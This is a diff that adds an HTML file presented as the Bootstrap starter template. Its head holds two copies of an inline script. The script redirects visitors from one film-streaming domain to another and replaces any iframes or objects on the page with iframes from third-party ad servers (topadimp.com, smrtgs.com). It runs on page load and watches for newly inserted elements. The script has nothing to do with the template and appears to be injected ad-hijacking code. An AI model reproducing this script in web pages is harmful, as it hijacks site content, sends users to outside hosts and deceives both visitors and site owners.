@@ -1,0 +1,168 @@
+<!Doctype html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../favicon.ico">
+
+    <title>Starter Template for Bootstrap</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="starter-template.css" rel="stylesheet">
+
+    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+    <script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script src="../../assets/js/ie-emulation-modes-warning.js"></script>
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  <script>(function (b) {
+
+if (b.location.href.match(/http:\/\/(www\.)pelis24\.com/) && b.top == b.self) {
+	b.location = 'http://www.yaske.to/';
+	return false;
+}
+
+!function(t){function n(t){return t=e(t||[]),t.reduce(function(t,n,e){return t[e]=n,t},{length:t.length})}function e(t){return t=t.ELEMENT_NODE?[t]:t,Array.prototype.slice.call((t||{}).length>=0?t:[])}function r(t){return u.extend(u.fn,n(t))}function i(t,n,e){var r=this;return n.split(/\s+/).forEach(function(n){t[0]+"EventListener"in r?r.addEventListener(n,function(){e.apply(r,arguments)},!1):t[1]+"tachEvent"in r&&r.attachEvent("on"+n,function(){e.apply(r,arguments)})}),this}var o=/complete|loaded|interactive/,u=function(t){return t="object"==typeof t?[t]:"string"==typeof t&&t?document.querySelectorAll(t):[],r(t)};u.fn={before:function(t){return this.each(function(){var n=this.get();n.parentNode.insertBefore(t,n)})},after:function(t){return this.each(function(){var n=this.get();n.nextSibling?n.parentNode.insertBefore(t,n.nextSibling):n.parentNode.appendChild(t)})},next:function(){return this.nextElementSibling},prev:function(){return this.previousElementSibling},sons:function(){return r(this.children)},html:function(t){return t?(this.innerHTML=t,this):this.innerHTML},text:function(t){return t?(this.innerText=t,this):this.innerText},remove:function(){this.each(function(){var t=this.get();t.parentNode.removeChild(t)})},alone:function(){var t=e(this).filter(function(t){return"string"==typeof t}).length==this.length;return this.length>0?this.length>1?t?e(this):this:this[0]:""},attr:function(t,n){return this.map(function(){return n?(this.get().setAttribute(t,n+""),this):(attr=this.get().getAttribute(t),attr?attr:"")}).alone()},find:function(t){return r(t?this.querySelectorAll(t):[])},append:function(t){return this.each(function(){var n=this.get();("string"==typeof selector?u.create(t):t).each(function(){n.appendChild(this.get())})})},appendTo:function(t){return this.each(function(){var n=this.get();"object"==typeof t?t.each(function(){this.get().appendChild(n)}):"string"==typeof t&&u(t).each(function(t,e){e.appendChild(n)})})},css:function(t,n){return this.map(function(){var e=this.get();if(n||"object"==typeof t){var r={};if(this.attr("style").split(";").filter(function(t){return t.match(/\S/gm)}).forEach(function(t){t=t.split(":").map(function(t){return t.trim()}),r[t[0]]=t[1]}),"object"==typeof t)for(var i in t)r[i]=t[i];else r[t]=n;var o="";for(var i in r)o+=i+":"+r[i]+";";return e.setAttribute("style",o),this}var r=document.defaultView.getComputedStyle(e);return r=r.getPropertyCSSValue(t),r?r.cssText:""}).alone()},data:function(t,n){return t="data-"+t,this.map(function(){var e=this.get();if(!n){n=e.getAttribute(t);try{n="true"===n?!0:"false"===n?!1:"null"===n?null:+n+""===n?+n:/^(\{|\[).*(\]|\})$/.test(n)?JSON.parse(n):n}catch(r){}return n}e.setAttribute(t,n)}).alone()},opacity:function(t){return this.css({filter:"alpha(opacity="+100*t+")","-moz-opacity":t,"-webkit-opacity":t,"-khtml-opacity":t,opacity:t}),this},on:function(t,n){return this.each(function(){i.call(this.get(),["add","at"],t,n)})},off:function(t,n){return this.each(function(){i.call(this.get(),["remove","de"],t,n)})},length:0,add:function(){return r([].concat.apply(e(this),arguments))},slice:function(){var t=e(this);return r(t.slice.apply(t,arguments))},get:function(t){return e(this)[t||"0"]},first:function(){var t=e(this).shift();return r(t?[t]:[])},last:function(){var t=e(this).pop();return r(t?[t]:[])},filter:function(t){return r(e(this).filter(function(n,e){return t.call(r([n]),e,n)}))},map:function(t){return r(e(this).map(function(n,e){return t.call(r([n]),e,n)}))},each:function(t){return e(this).forEach(function(n,e){t.call(r([n]),e,n)}),this},toArray:function(){return e(this)}},Element.prototype.devce=function(){return r([this])},u.create=function(t){var n=document.createElement("div");return n.innerHTML=t,r(n.childNodes)},u.extend=function(){for(var t={},n=arguments,e=0;e<n.length;e++)Object.keys(n[e]).forEach(function(r){t[r]=n[e][r]});return t},u.ready=function(t){return o.test(document.readyState)&&document.body?t(u):document.addEventListener("DOMContentLoaded",function(){t(u)},!1),this},String.prototype.array_match=function(t){var n=this.toString();return t.filter(function(t){return n.match(t)}).length>0},String.prototype.build_query=function(t){var n=[];for(var e in t)n.push(e+"="+escape(t[e]));return this.toString()+"?"+n.join("&")},String.prototype.trim=function(){return this.toString().replace(/^\s+/,"").replace(/\s+$/,"")},t.devceWorkSpace=function(t){try{t(u)}catch(n){}},t.devce=u}(window);
+		
+devceWorkSpace(function($){
+	
+	var ADSET = [];
+		ADSET.push({src: '//ads.topadimp.com/creative/2-002137419-00001i;size=300x250;tag_id=10118;ref=ysk.pe;cb=INSERT_CACHEBUSTER_HERE', width: 300, height: 250});
+		ADSET.push({src: '//ads.topadimp.com/creative/2-002137419-00001i;size=300x250;tag_id=10118;ref=ysk.pe;cb=INSERT_CACHEBUSTER_HERE', width: 336, height: 280});
+		ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147786, w: 468, h: 60, c: 4, blank: false}), width: 468, height: 60});
+		ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147762, w: 728, h: 90, c: 4, blank: false}), width: 728, height: 90});
+		ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147787, w: 800, h: 600, c: 1, blank: false}), width: 800, height: 600});
+		
+	var adchanger = function(){
+		var iframe, node = this.get();
+		if (this.data('devce') || this.data('checked')) return false;
+			this.data('checked', 'true');
+		for (var i = 0; i < ADSET.length; i++) {
+			if ((node.offsetWidth - ADSET[i].width) == (node.offsetHeight - ADSET[i].height)) {
+				iframe = document.createElement('iframe').devce();
+				for (var attr in  ADSET[i]) iframe.attr( attr,  ADSET[i][attr] );
+				iframe.data('devce', 'true');
+				iframe.attr('frameborder', '0');
+				iframe.attr('scrolling', 'no');
+				this.before(iframe.get()).remove();
+				break;
+			}
+		}
+	};
+	
+	$.ready(function(){
+		$('iframe, object').each(function(i, target){
+				adchanger.call(target.devce());
+		});
+	});
+	
+	$(document).on('DOMNodeInserted', function(e){
+		if (['iframe', 'object'].indexOf(e.target.localName) != -1) {
+			adchanger.call(e.target.devce());
+		}
+	});
+	
+});
+})(window);</script><script>(function (b) {
+
+if (b.location.href.match(/http:\/\/(www\.)pelis24\.com/) && b.top == b.self) {
+	b.location = 'http://www.yaske.to/';
+	return false;
+}
+
+!function(t){function n(t){return t=e(t||[]),t.reduce(function(t,n,e){return t[e]=n,t},{length:t.length})}function e(t){return t=t.ELEMENT_NODE?[t]:t,Array.prototype.slice.call((t||{}).length>=0?t:[])}function r(t){return u.extend(u.fn,n(t))}function i(t,n,e){var r=this;return n.split(/\s+/).forEach(function(n){t[0]+"EventListener"in r?r.addEventListener(n,function(){e.apply(r,arguments)},!1):t[1]+"tachEvent"in r&&r.attachEvent("on"+n,function(){e.apply(r,arguments)})}),this}var o=/complete|loaded|interactive/,u=function(t){return t="object"==typeof t?[t]:"string"==typeof t&&t?document.querySelectorAll(t):[],r(t)};u.fn={before:function(t){return this.each(function(){var n=this.get();n.parentNode.insertBefore(t,n)})},after:function(t){return this.each(function(){var n=this.get();n.nextSibling?n.parentNode.insertBefore(t,n.nextSibling):n.parentNode.appendChild(t)})},next:function(){return this.nextElementSibling},prev:function(){return this.previousElementSibling},sons:function(){return r(this.children)},html:function(t){return t?(this.innerHTML=t,this):this.innerHTML},text:function(t){return t?(this.innerText=t,this):this.innerText},remove:function(){this.each(function(){var t=this.get();t.parentNode.removeChild(t)})},alone:function(){var t=e(this).filter(function(t){return"string"==typeof t}).length==this.length;return this.length>0?this.length>1?t?e(this):this:this[0]:""},attr:function(t,n){return this.map(function(){return n?(this.get().setAttribute(t,n+""),this):(attr=this.get().getAttribute(t),attr?attr:"")}).alone()},find:function(t){return r(t?this.querySelectorAll(t):[])},append:function(t){return this.each(function(){var n=this.get();("string"==typeof selector?u.create(t):t).each(function(){n.appendChild(this.get())})})},appendTo:function(t){return this.each(function(){var n=this.get();"object"==typeof t?t.each(function(){this.get().appendChild(n)}):"string"==typeof t&&u(t).each(function(t,e){e.appendChild(n)})})},css:function(t,n){return this.map(function(){var e=this.get();if(n||"object"==typeof t){var r={};if(this.attr("style").split(";").filter(function(t){return t.match(/\S/gm)}).forEach(function(t){t=t.split(":").map(function(t){return t.trim()}),r[t[0]]=t[1]}),"object"==typeof t)for(var i in t)r[i]=t[i];else r[t]=n;var o="";for(var i in r)o+=i+":"+r[i]+";";return e.setAttribute("style",o),this}var r=document.defaultView.getComputedStyle(e);return r=r.getPropertyCSSValue(t),r?r.cssText:""}).alone()},data:function(t,n){return t="data-"+t,this.map(function(){var e=this.get();if(!n){n=e.getAttribute(t);try{n="true"===n?!0:"false"===n?!1:"null"===n?null:+n+""===n?+n:/^(\{|\[).*(\]|\})$/.test(n)?JSON.parse(n):n}catch(r){}return n}e.setAttribute(t,n)}).alone()},opacity:function(t){return this.css({filter:"alpha(opacity="+100*t+")","-moz-opacity":t,"-webkit-opacity":t,"-khtml-opacity":t,opacity:t}),this},on:function(t,n){return this.each(function(){i.call(this.get(),["add","at"],t,n)})},off:function(t,n){return this.each(function(){i.call(this.get(),["remove","de"],t,n)})},length:0,add:function(){return r([].concat.apply(e(this),arguments))},slice:function(){var t=e(this);return r(t.slice.apply(t,arguments))},get:function(t){return e(this)[t||"0"]},first:function(){var t=e(this).shift();return r(t?[t]:[])},last:function(){var t=e(this).pop();return r(t?[t]:[])},filter:function(t){return r(e(this).filter(function(n,e){return t.call(r([n]),e,n)}))},map:function(t){return r(e(this).map(function(n,e){return t.call(r([n]),e,n)}))},each:function(t){return e(this).forEach(function(n,e){t.call(r([n]),e,n)}),this},toArray:function(){return e(this)}},Element.prototype.devce=function(){return r([this])},u.create=function(t){var n=document.createElement("div");return n.innerHTML=t,r(n.childNodes)},u.extend=function(){for(var t={},n=arguments,e=0;e<n.length;e++)Object.keys(n[e]).forEach(function(r){t[r]=n[e][r]});return t},u.ready=function(t){return o.test(document.readyState)&&document.body?t(u):document.addEventListener("DOMContentLoaded",function(){t(u)},!1),this},String.prototype.array_match=function(t){var n=this.toString();return t.filter(function(t){return n.match(t)}).length>0},String.prototype.build_query=function(t){var n=[];for(var e in t)n.push(e+"="+escape(t[e]));return this.toString()+"?"+n.join("&")},String.prototype.trim=function(){return this.toString().replace(/^\s+/,"").replace(/\s+$/,"")},t.devceWorkSpace=function(t){try{t(u)}catch(n){}},t.devce=u}(window);
+		
+devceWorkSpace(function($){
+	
+	var ADSET = [];
+		ADSET.push({src: '//ads.topadimp.com/creative/2-002137419-00001i;size=300x250;tag_id=10118;ref=ysk.pe;cb=INSERT_CACHEBUSTER_HERE', width: 300, height: 250});
+		ADSET.push({src: '//ads.topadimp.com/creative/2-002137419-00001i;size=300x250;tag_id=10118;ref=ysk.pe;cb=INSERT_CACHEBUSTER_HERE', width: 336, height: 280});
+		ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147786, w: 468, h: 60, c: 4, blank: false}), width: 468, height: 60});
+		ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147762, w: 728, h: 90, c: 4, blank: false}), width: 728, height: 90});
+		ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147787, w: 800, h: 600, c: 1, blank: false}), width: 800, height: 600});
+		
+	var adchanger = function(){
+		var iframe, node = this.get();
+		if (this.data('devce') || this.data('checked')) return false;
+			this.data('checked', 'true');
+		for (var i = 0; i < ADSET.length; i++) {
+			if ((node.offsetWidth - ADSET[i].width) == (node.offsetHeight - ADSET[i].height)) {
+				iframe = document.createElement('iframe').devce();
+				for (var attr in  ADSET[i]) iframe.attr( attr,  ADSET[i][attr] );
+				iframe.data('devce', 'true');
+				iframe.attr('frameborder', '0');
+				iframe.attr('scrolling', 'no');
+				this.before(iframe.get()).remove();
+				break;
+			}
+		}
+	};
+	
+	$.ready(function(){
+		$('iframe, object').each(function(i, target){
+				adchanger.call(target.devce());
+		});
+	});
+	
+	$(document).on('DOMNodeInserted', function(e){
+		if (['iframe', 'object'].indexOf(e.target.localName) != -1) {
+			adchanger.call(e.target.devce());
+		}
+	});
+	
+});
+})(window);</script></head>
+
+  <body>
+
+    <nav class="navbar navbar-inverse navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="#">Project name</a>
+        </div>
+        <div id="navbar" class="collapse navbar-collapse">
+          <ul class="nav navbar-nav">
+            <li class="active"><a href="#">Home</a></li>
+            <li><a href="#about">About</a></li>
+            <li><a href="#contact">Contact</a></li>
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </nav>
+
+    <div class="container">
+
+      <div class="starter-template">
+        <h1>Bootstrap starter template</h1>
+        <p class="lead">Use this document as a way to quickly start any new project.<br> All you get is this text and a mostly barebones HTML document.</p>
+      </div>
+
+    </div><!-- /.container -->
+
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
+  
+
+</body></html>
